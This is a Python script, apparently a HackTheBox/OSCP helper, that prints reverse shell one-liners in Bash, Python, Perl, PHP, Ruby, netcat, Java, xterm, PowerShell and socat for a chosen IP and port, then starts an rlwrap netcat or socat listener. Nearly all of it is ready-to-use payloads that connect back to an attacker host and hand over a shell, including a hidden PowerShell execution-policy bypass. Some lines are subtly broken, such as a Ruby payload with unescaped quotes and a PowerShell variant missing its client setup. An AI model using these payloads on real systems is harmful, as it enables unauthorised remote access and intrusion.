#!/usr/bin/env python3
# -*- coding:utf-8 -*- 

#pip install colorama

__author__ = "Dviros, ihebski, @KeyStrOke95 Thanks for Trolls"
__tags__ = "Hackthebox & OSCP"
import sys
import os
from colorama import Fore, Back, Style
import subprocess
import shutil


def start(argv):
	rlwrap = shutil.which('rlwrap') is not None
	if len(sys.argv) < 2:
		print('Dude, IP or Port???	 ¯\_(ツ)_/¯')
		sys.exit()
	if rlwrap == False:
		print('You need to install rlwrap to support better shellz...')
		sys.exit()
	else:
		if len(sys.argv) == 3:
			main(argv[0],int(argv[1]))
		else:
			try:
				ip = os.popen("ip a s tun0").read().split("inet ")[1].split("/")[0]
			except:
				print(Fore.RED, "[X] VPN device was not found. Try to reset your VPN service or specify manually the listening IP. EXITING")
				sys.exit()
				
			main(ip,int(argv[0]))

def print_shell(ip,port,choice):
	if choice == '1':
		print(Fore.BLUE, '[+] Bash Payload')
		print(Fore.RED, 'Payload 01 => ', Fore.WHITE + '\n' + f'bash -i >& /dev/tcp/{ip}/{port} 0>&1')
		print(Fore.WHITE + f'')
		print(Fore.RED, 'Payload 02 => ', Fore.WHITE + '\n' + f'0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196')
		print(Fore.WHITE + f'You can also check for sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash')
		
	elif(choice == '2'):
		print(Fore.BLUE, '[+] Python Payload')
		print(Fore.RED, 'Payload 01 => ', Fore.WHITE + '\n' + f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")
		print(Fore.WHITE + f'')
		print(Fore.RED, 'Payload 01 => ', Fore.WHITE + '\n' + f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn([\"/bin/bash\"]);'")

	elif(choice == '3'):
		print(Fore.BLUE, '[+] Perl Payload')
		print(Fore.RED, 'Payload 01 => ', Fore.WHITE + '\n' + f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'")
		print(Fore.WHITE + f'')
		#print(Fore.WHITE + f"perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{IP}\":{port});STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"")
		print(Fore.RED, 'Payload 02 => ', Fore.WHITE + '\n' + f"Perl on Windows: perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,'{ip}:{port}');STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'")

	elif(choice == '4'):
		print(Fore.BLUE, '[+] PHP Payload')
		print(Fore.RED, 'Payload 01 => ', Fore.WHITE + '\n' + f"php -r '$sock=fsockopen(\"{ip}\",\"{port}\");exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
		print(Fore.WHITE + f'')
		print(Fore.RED, 'Payload 02 => ', Fore.WHITE + '\n' + f"php -r '$sock=fsockopen(\"{ip}\",\"{port}\");$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'")
		
	elif(choice == '5'):
		print(Fore.BLUE, '[+] Ruby Payload')
		print(Fore.RED, 'Payload 01 => ', Fore.WHITE + '\n' + f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'")
		print(Fore.WHITE + f'')
		print(Fore.RED, 'Payload 02 => ', Fore.WHITE + '\n' + f"ruby -rsocket -e 'c=TCPSocket.new(\"{ip}\",\"{port}\");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'")
		
	elif(choice == '6'):
		print(Fore.BLUE, '[+] Netcat Payload')
		print(Fore.RED, 'Payload 01 => ', Fore.WHITE + '\n' + f'nc -e /bin/sh {ip} {port}')
		print(Fore.WHITE + f'')
		print(Fore.RED, 'Payload 02 => ', Fore.WHITE + '\n' + f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc {ip} {port} >/tmp/f')
		print(Fore.WHITE + f'')
		print(Fore.RED, 'Payload 03 => ', Fore.WHITE + '\n' + f'bash -i >& /dev/tcp/{ip}/{port} 0>&1')
		
	elif(choice == '7'):
		print(Fore.BLUE, '[+] Java Payload')
		print(Fore.WHITE, f"r = Runtime.getRuntime()p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{ip!s}/{port!s};cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])p.waitFor()")
		
	elif(choice == '8'):
		print(Fore.BLUE, '[+] xTerm Payload')
		print(Fore.WHITE, f'xterm -display {ip}:1')
		
	elif(choice == '9'):
		print(Fore.BLUE, '[+] Powershell Payload')
		print(Fore.RED, 'Payload 01 => ', Fore.WHITE + '\n' + f'$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port})' + ';$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()')
		print(Fore.WHITE + f'')
		print(Fore.RED, 'Payload 02 => ', Fore.WHITE + '\n' + f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{ip}",{port})' + ';$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()')
	
	elif(choice == '10'):
		print(Fore.BLUE, '[+] Socat')
		print(Fore.WHITE + f"socat TCP4:{ip}:{port} EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane")
		
	elif(choice == '0'):
		print(Fore.RED, "[-] See you later")
		sys.exit(0)
		
	else:
		print("\n\t\t[-]Wrong Choice")
		main(ip,port)
		
		
def main(ip,port):
	print(Fore.WHITE + "[+] IP Address in use ", ip)
	print(Fore.GREEN + "\nThe current ip:="+ip + Fore.GREEN + "\tThe current port:="+str(port)  +"\n" )
	print(Fore.YELLOW + "[1].BASH REVERSE SHELL\n")
	print(Fore.RED +	"[2].PYTHON REVERSE SHELL\n")
	print(Fore.GREEN +  "[3].PERL REVERSE SHELL\n")
	print(Fore.YELLOW + "[4].PHP REVERSE SHELL\n")
	print(Fore.RED +	"[5].RUBY REVERSE SHELL\n")
	print(Fore.GREEN + "[6].NETCAT REVERSE SHELL\n")
	print(Fore.YELLOW +  "[7].JAVA REVERSE SHELL\n")
	print(Fore.RED +	"[8].XTERM REVERSE SHELL\n")
	print(Fore.GREEN + "[9].POWERSHELL REVERSE SHELL\n")
	print(Fore.YELLOW +  "[10].SOCAT\n")
	print(Fore.YELLOW + "[0].EXIT\n")
	choice = str(input(Fore.RED + "9 Types of Payloads, Choose Wisely:="))
	print_shell(ip, port, choice)
	
	print(Fore.GREEN, '\n[+] Incoming shell *-*', end='')
	if port > 1023:
		cmd = f'rlwrap nc -lnvp {port}'
		print('\033[39m')
		
	elif (choice == '10') and port > 1023:
	    cmd = f'rlwrap socat -d TCP4-LISTEN:{port} STDOUT'
	    print('\033[39m')
	    
	elif (choice == '10') and port < 1023:
	    cmd = f'sudo rlwrap socat -d TCP4-LISTEN:{port} STDOUT'
	    print(Fore.RED, 'with sudo', '\033[39m')
	    
	else:
		cmd = f'sudo rlwrap nc -lnvp {port}'
		print(Fore.RED, 'with sudo', '\033[39m')
	subprocess.call([cmd], shell=True)

if __name__ == '__main__':
	try:
		start(sys.argv[1:])
	except KeyboardInterrupt as err:
		print(Fore.RED, "OH NOOOOO I'M MELTINGGGGGGGG")
		sys.exit(0)
